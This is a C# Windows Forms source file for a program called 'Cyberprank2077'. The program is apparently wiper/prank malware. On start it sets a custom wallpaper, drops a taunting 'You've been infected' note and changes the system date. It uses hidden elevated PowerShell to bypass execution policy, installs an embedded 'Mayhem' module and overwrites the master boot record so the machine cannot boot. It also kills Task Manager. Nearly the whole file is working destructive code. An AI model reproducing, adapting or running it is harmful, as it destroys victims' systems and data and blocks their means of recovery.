using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Globalization;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System.Media;

namespace Cyberprank2077
{

    public partial class Cyberprank2077 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uiAction, UInt32 uiParam, String pvParam, UInt32 fWinIni);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_UPDATEINIFILE = 0x1;

        public void SetImg(string imagefile)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imagefile, SPIF_UPDATEINIFILE);
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //This is Very Important Code... DON'T CHANGE THIS!!! 

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public void MBROverwrite()
        {
            try
            {
                ProcessStartInfo nbc = new ProcessStartInfo();
                nbc.FileName = "powershell";
                nbc.Arguments = "Set-ExecutionPolicy Bypass -Scope CurrentUser -Force";
                nbc.WindowStyle = ProcessWindowStyle.Hidden; 
                nbc.Verb = "runas";
                Process.Start(nbc);
                Directory.CreateDirectory(@"C:\Temp");
                Extract("Cyberprank2077", @"C:\Temp", "Resources", "Mayhem.psd1");
                Extract("Cyberprank2077", @"C:\Temp", "Resources", "Mayhem.psm1");
                Extract("Cyberprank2077", @"C:\Windows", "Resources", "Cyberprank2077VVV.wav");
                Extract("Cyberprank2077", @"C:\Windows", "Resources", "Cyberprank2077.jpg");
                Directory.CreateDirectory(@"C:\Program Files\WindowsPowerShell\Modules\Mayhem");
                File.Copy(@"C:\Temp\Mayhem.psd1", @"C:\Program Files\WindowsPowerShell\Modules\Mayhem\Mayhem.psd1");
                File.Copy(@"C:\Temp\Mayhem.psm1", @"C:\Program Files\WindowsPowerShell\Modules\Mayhem\Mayhem.psm1");
                File.Delete(@"C:\Temp\Mayhem.psd1");
                File.Delete(@"C:\Temp\Mayhem.psm1");
                Thread.Sleep(10000);
                ProcessStartInfo ggg = new ProcessStartInfo();
                ggg.FileName = "powershell";
                ggg.Arguments = "Install-Module Mayhem";
                ggg.Verb = "runas";
                ggg.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(ggg);
                ProcessStartInfo mbr = new ProcessStartInfo();
                mbr.FileName = "powershell";
                mbr.Arguments = "Set-MasterBootRecord -BootMessage 'Ur PC is Dead... Good Luck with Restore. #01F41F' -Force -Confirm";
                mbr.Verb = "runas";
                mbr.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(mbr);
            }
            catch (Exception ex)
            {
                System.Windows.Forms.MessageBox.Show(ex.Message, "Cyberprank 2077", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(213);
            }
        }
        public Cyberprank2077()
        {
            SetImg(@"C:\Windows\Cyberprank2077.jpg");
            var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());
            File.WriteAllText($@"C:\Users\{Environment.UserName}\Desktop\Cyberprank2077.txt", "You've been infected by Cyberprank 2077 \nYou're PC is Dead :D");
            if(File.Exists($@"C:\Users\{Environment.UserName}\Desktop\Cyberprank2077.txt"))
            {
                Process.Start("notepad", $@"C:\Users\{Environment.UserName}\Desktop\Cyberprank2077.txt");
            }
            ProcessStartInfo datetime = new ProcessStartInfo();
            datetime.FileName = "cmd";
            datetime.Arguments = "/c date 02-11-2077";
            datetime.Verb = "runas";
            datetime.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(datetime);
            Thread.Sleep(2500);
            MBROverwrite();
            SoundPlayer jx = new SoundPlayer();
            jx = new SoundPlayer(@"C:\Windows\Cyberprank2077VVV.wav");
            jx.PlayLooping();
            InitializeComponent();
            Process[] tsk = Process.GetProcessesByName("taskmgr");
            if(tsk.Length == 1)
            {
                ProcessStartInfo block_tsk = new ProcessStartInfo();
                block_tsk.FileName = "cmd.exe";
                block_tsk.WindowStyle = ProcessWindowStyle.Hidden;
                block_tsk.Arguments = "/c taskkill /f /im taskmgr.exe && exit";
                Process.Start(block_tsk);
            }
        }
    }
}
